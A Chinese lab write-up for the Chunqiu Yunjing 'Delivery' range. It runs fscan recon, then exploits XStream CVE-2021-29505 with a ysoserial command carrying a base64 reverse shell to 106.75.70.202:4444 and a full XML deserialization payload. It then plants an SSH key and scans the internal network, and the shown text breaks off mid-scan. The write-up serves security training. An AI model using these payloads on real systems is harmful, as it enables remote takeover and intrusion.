<!DOCTYPE html>
<html lang="zh-CN">
    <head>
  <!-- 元数据 -->
  <meta charset="utf-8">
  
  
  <title>春秋云镜-Delivery | lvzhouhang</title>
  <link rel="canonical" href="https://lvzhouhang.xyz/2025/04/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/">
  <meta name="author" content="lvzhouhang" />
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="index,follow" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="format-detection" content="telphone=no, email=no" />
  
    <meta name="keywords" content="靶机" />
  
  <meta name="description" content="FLAG01先用 fscan 进行一波信息搜集 12345678910111213141516171819202122232425262728293031┌──(root㉿kali)-[~&#x2F;Desktop&#x2F;tmp]└─# ..&#x2F;pentest&#x2F;fscan&#x2F;fscan2 -h 39.99.157.149┌──────────────────────────────────────────────┐│">
<meta property="og:type" content="article">
<meta property="og:title" content="春秋云镜-Delivery">
<meta property="og:url" content="https://lvzhouhang.xyz/2025/04/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/index.html">
<meta property="og:site_name" content="lvzhouhang">
<meta property="og:description" content="FLAG01先用 fscan 进行一波信息搜集 12345678910111213141516171819202122232425262728293031┌──(root㉿kali)-[~&#x2F;Desktop&#x2F;tmp]└─# ..&#x2F;pentest&#x2F;fscan&#x2F;fscan2 -h 39.99.157.149┌──────────────────────────────────────────────┐│">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-04-27T07:42:03.000Z">
<meta property="article:modified_time" content="2025-04-29T03:23:01.542Z">
<meta property="article:author" content="lvzhouhang">
<meta property="article:tag" content="靶机">
<meta name="twitter:card" content="summary">
  
  <!-- 样式表文件 -->
  <link rel="stylesheet" id="kratos-css" href="/css/kr-core.min.css" media="all"></link>
  
    <link rel="stylesheet" id="highlight-css" href="/css/highlight/highlight.js/night-eighties.min.css" media="all"></link>
  
  <link rel="stylesheet" id="theme-light-css" href="/css/kr-theme/light.min.css" media="all"></link>
  <link rel="stylesheet" id="theme-dark-css" href="/css/kr-theme/dark.min.css" media="(prefers-color-scheme: dark)"></link>
  <script src="/js/kr-theme.min.js"></script>
  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></link>
  
    <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></link>
  
  
    <link rel="stylesheet" href="/vendors/viewerjs@1.11.6/dist/viewer.min.css"></link>
  
  <!-- 不得不预先加载的一些JS文件 -->
  
    <script src="/vendors/qr-code-styling@1.6.0-rc.1/lib/qr-code-styling.js"></script>
  
  <!-- 自定义站点横幅和背景 -->
  <style>
    
      .kratos-cover.kratos-cover-2 {
        background-image: url('https://dev.krt.moe/demo-assets/banner.webp');
      }
      html[data-theme="dark"] .kratos-cover.kratos-cover-2 {
        background-image: url('https://dev.krt.moe/demo-assets/banner_dark.webp');
      }
    
    
      @media(min-width:768px) {
        body.custom-background {
          background-image: url('https://dev.krt.moe/demo-assets/bg.webp');
        }
        html[data-theme="dark"] body.custom-background {
          background-image: url('https://dev.krt.moe/demo-assets/bg.webp');
        }
      }
    
    
      .widget-kratos-about .photo-background {
        background-image: url('/images/default.webp');
      }
      html[data-theme="dark"] .widget-kratos-about .photo-background {
        background-image: url('/images/default.webp');
      }
    
  </style>

  <!-- 额外的追加注入项 -->
  
<meta name="generator" content="Hexo 7.3.0"></head>

    <body class="custom-background">
        <div id="kratos-wrapper">
    <div id="kratos-page">
        <div id="kratos-header">
            <header id="kratos-desktop-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="nav-header">
                        <nav id="kratos-menu-wrap">
                            <ul id="kratos-primary-menu" class="sf-menu">
                                
                                    <li>
                                        
                                            <a href="/">
                                        
                                            
                                                <i class="fa fa-home"></i>
                                            
                                            首页
                                        </a>
                                        
                                    </li>
                                
                                    <li>
                                        
                                            <a href="/archives/">
                                        
                                            
                                                <i class="fa fa-file"></i>
                                            
                                            档案馆
                                        </a>
                                        
                                    </li>
                                
                                    <li>
                                        
                                            <a href="/about/">
                                        
                                            
                                                <i class="fa fa-user"></i>
                                            
                                            关于
                                        </a>
                                        
                                    </li>
                                
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>
            <header id="kratos-mobile-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="color-logo"><a href="/">lvzhouhang</a></div>
                    <div id="kratos-nav-toggle-wrapper" class="nav-toggle">
                        <a id="kratos-nav-toggle" class="kratos-nav-toggle">
                            <i></i>
                        </a>
                    </div>
                </div>
            </header>
        </div>
        <div class="kratos-start kratos-hero-2">
            <!-- <div class="kratos-overlay"></div> -->
            <div class="kratos-cover kratos-cover-2 text-center">
                <div class="desc desc2 animate-box">
                    <a href="/">
                        <h2>lvzhouhang</h2> <br />
                        <span></span>
                    </a>
                </div>
            </div>
        </div>

        <div id="kratos-blog-post">
            <div class="container">
                <div id="main" class="row">


        

            

            <section class="kr-main-col col-md-8">

        

            <article itemscope itemtype="https://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/">
    <div class="kratos-hentry kratos-page-inner clearfix">
        <header class="kratos-page-header">
            
                <h1 class="kratos-page-title text-center" itemprop="name headline">春秋云镜-Delivery</h1>
            
            <ul class="kratos-page-meta text-center">
                <li><time datetime="2025-04-27T07:42:03.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2025-04-27</time></li>
                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                    <i class="fa fa-user"></i> 作者 <span itemprop="name">lvzhouhang</span>
                </li>
                
                    <li>
                        <i class="fa fa-edit"></i> 
                        
                        
                            ~35.94K
                        
                        字
                    </li>
                
                
                
            </ul>
        </header>
        <div class="kratos-page-content kr-post">
            
            
            
                <div class="kratos-post-inner-toc toc-div-class" >
                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FLAG01"><span class="toc-number">1.</span> <span class="toc-text">FLAG01</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FLAG02"><span class="toc-number">2.</span> <span class="toc-text">FLAG02</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FLAG03"><span class="toc-number">3.</span> <span class="toc-text">FLAG03</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FLAG04"><span class="toc-number">4.</span> <span class="toc-text">FLAG04</span></a></li></ol>
                </div>
            
            <hr />
            <div itemprop="articleBody"><h1 id="FLAG01"><a href="#FLAG01" class="headerlink" title="FLAG01"></a>FLAG01</h1><p>先用 fscan 进行一波信息搜集</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ../pentest/fscan/fscan2 -h 39.99.157.149</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     _ __  __ _ _ __ __ _  _ __| | __    │</span><br><span class="line">│  / /_\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_ ____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \_ _,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-27 03:44:50] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-27 03:44:50] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-27 03:44:50] [INFO] 最终有效主机数量: 1</span><br><span class="line">[2025-04-27 03:44:51] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-27 03:44:51] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-27 03:44:51] [SUCCESS] 端口开放 39.99.157.149:22</span><br><span class="line">[2025-04-27 03:44:51] [SUCCESS] 端口开放 39.99.157.149:80</span><br><span class="line">[2025-04-27 03:44:51] [SUCCESS] 端口开放 39.99.157.149:21</span><br><span class="line">[2025-04-27 03:44:51] [SUCCESS] 服务识别 39.99.157.149:22 =&gt; [ssh] 版本: 8.2p1 Ubuntu 4ubuntu0.5 产品: OpenSSH 系统: Linux 信息: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-27 03:44:51] [SUCCESS] 服务识别 39.99.157.149:21 =&gt; [ftp] 版本: 3.0.3 产品: vsftpd 系统: Unix Banner: [220 (vsFTPd 3.0.3).]</span><br><span class="line">[2025-04-27 03:44:53] [SUCCESS] 端口开放 39.99.157.149:8080</span><br><span class="line">[2025-04-27 03:44:56] [SUCCESS] 服务识别 39.99.157.149:80 =&gt; [http]</span><br><span class="line">[2025-04-27 03:44:59] [SUCCESS] 服务识别 39.99.157.149:8080 =&gt; [http]</span><br><span class="line">[2025-04-27 03:45:00] [INFO] 存活端口数量: 4</span><br><span class="line">[2025-04-27 03:45:00] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-27 03:45:00] [INFO] 加载的插件: ftp, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-27 03:45:01] [SUCCESS] 网站标题 http://39.99.157.149      状态码: 200 长度: 10918  标题: Apache2 Ubuntu Default Page: It works</span><br><span class="line">[2025-04-27 03:45:02] [SUCCESS] 匿名登录成功!</span><br><span class="line">[2025-04-27 03:45:02] [SUCCESS] 网站标题 http://39.99.157.149:8080 状态码: 200 长度: 3655   标题: 公司发货单</span><br><span class="line">[2025-04-27 03:45:08] [SUCCESS] 扫描已完成: 6/6</span><br></pre></td></tr></table></figure>

<p>ftp 可以匿名登陆，登录之后可以下载一个 pom.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt; project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot; xmlns: xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi: schemaLocation = &quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot; &gt;</span><br><span class="line">    &lt;modelVersion&gt; 4.0.0 &lt;/modelVersion&gt;</span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        &lt;groupId&gt; org.springframework.boot &lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt; spring-boot-starter-parent &lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt; 2.7.2 &lt;/version&gt;</span><br><span class="line">        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;</span><br><span class="line">    &lt;/parent&gt;</span><br><span class="line">    &lt;groupId&gt; com.example &lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt; ezjava &lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt; 0.0.1-SNAPSHOT &lt;/version&gt;</span><br><span class="line">    &lt;name&gt; ezjava &lt;/name&gt;</span><br><span class="line">    &lt;description&gt; ezjava &lt;/description&gt;</span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;java.version&gt; 1.8 &lt;/java.version&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt; org.springframework.boot &lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt; spring-boot-starter-thymeleaf &lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt; org.springframework.boot &lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt; spring-boot-starter-web &lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt; org.springframework.boot &lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt; spring-boot-starter-test &lt;/artifactId&gt;</span><br><span class="line">            &lt;scope&gt; test &lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt; com.thoughtworks.xstream &lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt; xstream &lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt; 1.4.16 &lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt; commons-collections &lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt; commons-collections &lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt; 3.2.1 &lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt; org.springframework.boot &lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt; spring-boot-maven-plugin &lt;/artifactId&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<p>存在有危险的依赖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">           &lt;groupId&gt; com.thoughtworks.xstream &lt;/groupId&gt;</span><br><span class="line">           &lt;artifactId&gt; xstream &lt;/artifactId&gt;</span><br><span class="line">           &lt;version&gt; 1.4.16 &lt;/version&gt;</span><br><span class="line">       &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">       &lt;dependency&gt;</span><br><span class="line">           &lt;groupId&gt; commons-collections &lt;/groupId&gt;</span><br><span class="line">           &lt;artifactId&gt; commons-collections &lt;/artifactId&gt;</span><br><span class="line">           &lt;version&gt; 3.2.1 &lt;/version&gt;</span><br><span class="line">       &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>存在 <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md">CVE-2021-29505</a> 用 ysoserial 进行反弹 shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot; bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuNzUuNzAuMjAyLzQ0NDQgMD4mMQ ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>在 8080 端口抓包替换成 payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">    &lt;unserializable-parents/&gt;</span><br><span class="line">    &lt;java.util.PriorityQueue&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">            &lt;size&gt; 2 &lt;/size&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">        &lt;int&gt; 3 &lt;/int&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt; 12345 &lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">                &lt;m__obj class=&#x27;string&#x27;&gt; com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content &lt;/m__obj&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt; 12345 &lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">                    &lt;parsedMessage&gt; true &lt;/parsedMessage&gt;</span><br><span class="line">                    &lt;soapVersion&gt; SOAP_11 &lt;/soapVersion&gt;</span><br><span class="line">                    &lt;bodyParts/&gt;</span><br><span class="line">                    &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">                        &lt;attachmentsInitialized&gt; false &lt;/attachmentsInitialized&gt;</span><br><span class="line">                        &lt;nullIter class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                            &lt;aliases class=&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;&gt;</span><br><span class="line">                                &lt;candidates class=&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;&gt;</span><br><span class="line">                                    &lt;names&gt;</span><br><span class="line">                                        &lt;string&gt; aa &lt;/string&gt;</span><br><span class="line">                                        &lt;string&gt; aa &lt;/string&gt;</span><br><span class="line">                                    &lt;/names&gt;</span><br><span class="line">                                    &lt;ctx&gt;</span><br><span class="line">                                        &lt;environment/&gt;</span><br><span class="line">                                        &lt;registry class=&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                            &lt;java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                                &lt;string&gt; UnicastRef &lt;/string&gt;</span><br><span class="line">                                                &lt;string&gt; 106.75.70.202 &lt;/string&gt;</span><br><span class="line">                                                &lt;int&gt; 1099 &lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt; 0 &lt;/long&gt;</span><br><span class="line">                                                &lt;int&gt; 0 &lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt; 0 &lt;/long&gt;</span><br><span class="line">                                                &lt;short&gt; 0 &lt;/short&gt;</span><br><span class="line">                                                &lt;boolean&gt; false &lt;/boolean&gt;</span><br><span class="line">                                            &lt;/java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                        &lt;/registry&gt;</span><br><span class="line">                                        &lt;host&gt; 106.75.70.202 &lt;/host&gt;</span><br><span class="line">                                        &lt;port&gt; 1099 &lt;/port&gt;</span><br><span class="line">                                    &lt;/ctx&gt;</span><br><span class="line">                                &lt;/candidates&gt;</span><br><span class="line">                            &lt;/aliases&gt;</span><br><span class="line">                        &lt;/nullIter&gt;</span><br><span class="line">                    &lt;/sm&gt;</span><br><span class="line">                &lt;/message&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>发包之后 shell 就弹出来了，然后写个公钥进去，flag1 在/root/flag 下</p>
<h1 id="FLAG02"><a href="#FLAG02" class="headerlink" title="FLAG02"></a>FLAG02</h1><p>上传一个 fscan 扫描内网，再搭建一个代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 :: 1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:16:3e: 09:09:4b brd ff: ff: ff: ff: ff: ff</span><br><span class="line">    inet 172.22.13.14/16 brd 172.22.255.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 315359007sec preferred_lft 315359007sec</span><br><span class="line">    inet6 fe80:: 216:3eff: fe09:94b/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">root@ubuntu:~# ./f</span><br><span class="line">flag/   fscan2</span><br><span class="line">root@ubuntu:~# ./fscan2 -h 172.22.13.14/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     _ __  __ _ _ __ __ _  _ __| | __    │</span><br><span class="line">│  / /_\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_ ____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \_ _,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-27 15:59:52] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-27 15:59:52] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-27 15:59:52] [INFO] CIDR 范围: 172.22.13.0-172.22.13.255</span><br><span class="line">[2025-04-27 15:59:52] [INFO] 生成 IP 范围: 172.22.13.0.%! d(string = 172.22.13.255) - %! s(MISSING).%! d(MISSING)</span><br><span class="line">[2025-04-27 15:59:52] [INFO] 解析 CIDR 172.22.13.14/24 -&gt; IP 范围 172.22.13.0-172.22.13.255</span><br><span class="line">[2025-04-27 15:59:52] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-04-27 15:59:52] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-27 15:59:52] [SUCCESS] 目标 172.22.13.14    存活 (ICMP)</span><br><span class="line">[2025-04-27 15:59:52] [SUCCESS] 目标 172.22.13.6     存活 (ICMP)</span><br><span class="line">[2025-04-27 15:59:52] [SUCCESS] 目标 172.22.13.57    存活 (ICMP)</span><br><span class="line">[2025-04-27 15:59:52] [SUCCESS] 目标 172.22.13.28    存活 (ICMP)</span><br><span class="line">[2025-04-27 15:59:55] [INFO] 存活主机数量: 4</span><br><span class="line">[2025-04-27 15:59:55] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.57:22</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.14:22</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.14:21</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:80</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.57:80</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:135</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.14:80</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.6:135</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.6:445</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.6:88</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.6:389</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:139</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.6:139</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:445</span><br><span class="line">[2025-04-27 